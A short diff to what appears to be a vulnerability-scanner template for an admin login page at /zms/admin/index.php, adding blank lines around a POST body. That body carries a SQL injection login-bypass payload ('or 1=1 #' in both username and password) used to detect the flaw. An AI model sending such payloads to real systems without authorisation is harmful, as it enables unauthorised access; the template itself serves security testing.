@@ -22,7 +22,9 @@ requests:
         Referer: http://{{Hostname}}/zms/admin/index.php
         Cookie: PHPSESSID=s22oss00i0ob4hcnsgkobb9r7p
         Upgrade-Insecure-Requests: 1
+
         username=dw1%27+or+1%3D1+%23&password=dw1%27+or+1%3D1+%23&login=
+
     redirects: true
     max-redirects: 1
     matchers-condition: and
